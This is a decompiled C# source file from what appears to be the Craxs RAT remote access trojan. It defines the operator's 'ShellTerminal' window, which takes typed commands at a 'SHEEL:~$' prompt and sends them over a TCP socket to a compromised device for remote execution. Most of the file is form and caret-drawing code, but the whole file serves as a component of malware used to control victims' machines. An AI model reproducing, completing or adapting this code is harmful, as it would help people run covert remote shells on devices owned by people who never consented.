using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class ShellTerminal : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutText")]
	private RTB _OutText;

	[AccessedThroughProperty("Caret")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _Caret;

	[CompilerGenerated]
	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[AccessedThroughProperty("PasteToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public Color Color_Default;

	private Rectangle rect;

	private int hidCareat;

	private Size CareatSize;

	private string TAGx;

	public bool ignore;

	public bool IAMNew;

	internal virtual RTB OutText
	{
		[CompilerGenerated]
		get
		{
			return _OutText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OutText_TextChanged;
			MouseEventHandler value3 = OutText_MouseClick;
			KeyEventHandler value4 = OutText_KeyDown;
			EventHandler value5 = OutText_HScroll;
			EventHandler value6 = OutText_VScroll;
			RTB rTB = _OutText;
			if (rTB != null)
			{
				rTB.TextChanged -= value2;
				rTB.MouseClick -= value3;
				rTB.KeyDown -= value4;
				rTB.HScroll -= value5;
				rTB.VScroll -= value6;
			}
			_OutText = value;
			rTB = _OutText;
			if (rTB != null)
			{
				rTB.TextChanged += value2;
				rTB.MouseClick += value3;
				rTB.KeyDown += value4;
				rTB.HScroll += value5;
				rTB.VScroll += value6;
			}
		}
	}

	internal virtual Timer Caret
	{
		[CompilerGenerated]
		get
		{
			return _Caret;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Caret_Tick;
			Timer timer = _Caret;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Caret = value;
			timer = _Caret;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("PB")]
	internal virtual ProgressBar PB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxMenu")]
	internal virtual ContextMenuStrip ctxMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CopyToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CopyToolStripMenuItem = value;
			toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PasteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PasteToolStripMenuItem = value;
			toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	public ShellTerminal()
	{
		base.Load += ShellTerminal_Load;
		Title = "null";
		rect = default(Rectangle);
		hidCareat = -1;
		CareatSize = new Size(6, 12);
		TAGx = "SHEEL:~$";
		ignore = false;
		IAMNew = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Caret = new System.Windows.Forms.Timer(this.components);
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.PB = new System.Windows.Forms.ProgressBar();
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OutText = new Craxs_Rat.RTB();
		this.ctxMenu.SuspendLayout();
		base.SuspendLayout();
		this.Caret.Interval = 500;
		this.TOpacity.Interval = 1;
		this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.PB.Location = new System.Drawing.Point(0, 231);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(414, 10);
		this.PB.TabIndex = 6;
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.ShowImageMargin = false;
		this.ctxMenu.Size = new System.Drawing.Size(78, 48);
		this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.CopyToolStripMenuItem.Text = "Copy";
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.PasteToolStripMenuItem.Text = "Paste";
		this.OutText.BackColor = System.Drawing.Color.Black;
		this.OutText.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.OutText.Dock = System.Windows.Forms.DockStyle.Fill;
		this.OutText.ForeColor = System.Drawing.Color.SkyBlue;
		this.OutText.Location = new System.Drawing.Point(0, 0);
		this.OutText.Name = "OutText";
		this.OutText.Size = new System.Drawing.Size(414, 231);
		this.OutText.TabIndex = 2;
		this.OutText.Text = "";
		this.OutText.WordWrap = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(414, 241);
		base.Controls.Add(this.OutText);
		base.Controls.Add(this.PB);
		base.Name = "ShellTerminal";
		base.Opacity = 0.0;
		this.Text = "ShellTerminal";
		this.ctxMenu.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void SpyStyle()
	{
		foreach (RichTextBox item in base.Controls.OfType<RichTextBox>())
		{
			item.ForeColor = SpySettings.DefaultColor_Foreground;
			item.BackColor = SpySettings.DefaultColor_Background;
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void ShellTerminal_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\15.ico");
		OutText.Font = reso.f;
		Size size = TextRenderer.MeasureText("S", reso.f);
		CareatSize = new Size(checked((int)Math.Round((double)size.Width / 2.0)), size.Height);
		SpyStyle();
		Text = Title;
		OutText.ContextMenuStrip = ctxMenu;
		Color_Default = OutText.ForeColor;
		OutText.TabStop = false;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		OutText.Focus();
		OutText.Select();
	}

	private void CaretShell(int alva)
	{
		string text = OutText.Text;
		if (text.Length > 0)
		{
			if (!(rect == default(Rectangle)))
			{
				OutText.Invalidate(rect);
			}
			OutText.Update();
			Graphics graphics = OutText.CreateGraphics();
			Point positionFromCharIndex = OutText.GetPositionFromCharIndex(OutText.SelectionStart);
			rect = new Rectangle(positionFromCharIndex.X, positionFromCharIndex.Y, CareatSize.Width, CareatSize.Height);
			int alpha = Color_Default.A;
			if (OutText.SelectionStart != text.Length)
			{
				alpha = alva;
			}
			graphics.FillRectangle(new Pen(Color.FromArgb(alpha, Color_Default.R, Color_Default.G, Color_Default.B), CareatSize.Width).Brush, rect);
			graphics.Dispose();
		}
	}

	private void Caret_Tick(object sender, EventArgs e)
	{
		if (ignore)
		{
			return;
		}
		if (hidCareat == -1)
		{
			if (!(rect == default(Rectangle)))
			{
				OutText.Invalidate(rect);
			}
			hidCareat = 1;
		}
		else
		{
			CaretShell(128);
			hidCareat = -1;
		}
	}

	private void OutText_TextChanged(object sender, EventArgs e)
	{
		if (!IAMNew && OutText.Text.Length == 0)
		{
			NewTag(isLine: false);
		}
		else if (!ignore)
		{
			RestCaret();
		}
	}

	private void OutText_MouseClick(object sender, MouseEventArgs e)
	{
		if (!ignore)
		{
			RestCaret();
		}
	}

	private void OutText_KeyDown(object sender, KeyEventArgs e)
	{
		if ((e.KeyData == Keys.Up) | (e.KeyData == Keys.Down) | (e.KeyData == Keys.Right) | (e.KeyData == Keys.Left))
		{
			e.SuppressKeyPress = true;
		}
		else if ((Control.ModifierKeys == Keys.Shift) | (Control.ModifierKeys == Keys.Control))
		{
			e.SuppressKeyPress = true;
		}
		else
		{
			if (OutText.ReadOnly || ignore)
			{
				return;
			}
			if (e.KeyData == Keys.Return)
			{
				e.SuppressKeyPress = true;
				if (OutText.Lines.Length > 0)
				{
					string text = OutText.Lines[checked(OutText.Lines.Length - 1)];
					if (!text.Contains(TAGx))
					{
						NewTag(isLine: true);
						return;
					}
					text = text.Substring(TAGx.Length);
					if (text.Length == 0)
					{
						return;
					}
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".terminal" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCommand + Data.SPL_SOCKET + "command" + Data.SPL_DATA + text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						OutText.ReadOnly = true;
						ignore = true;
						if (!(rect == default(Rectangle)))
						{
							OutText.Invalidate(rect);
						}
						classClient.SendMessage(parametersObjects);
					}
				}
			}
			RestCaret();
		}
	}

	public void NewTag(bool isLine)
	{
		OutText.DeselectAll();
		if (isLine)
		{
			RTB outText = OutText;
			outText.AppendText("\r\n" + TAGx);
			outText = null;
		}
		else
		{
			RTB outText2 = OutText;
			outText2.AppendText(TAGx);
			outText2 = null;
		}
		OutText.SelectionStart = OutText.Text.Length;
	}

	private void RestCaret()
	{
		if (!ignore)
		{
			CaretShell(128);
			Caret.Enabled = false;
			Caret.Enabled = true;
		}
	}

	private void OutText_HScroll(object sender, EventArgs e)
	{
		OutText.Invalidate();
		CaretShell(255);
	}

	private void OutText_VScroll(object sender, EventArgs e)
	{
		OutText.Invalidate();
		CaretShell(255);
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!OutText.ReadOnly)
		{
			OutText.Paste();
		}
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		OutText.Copy();
	}
}
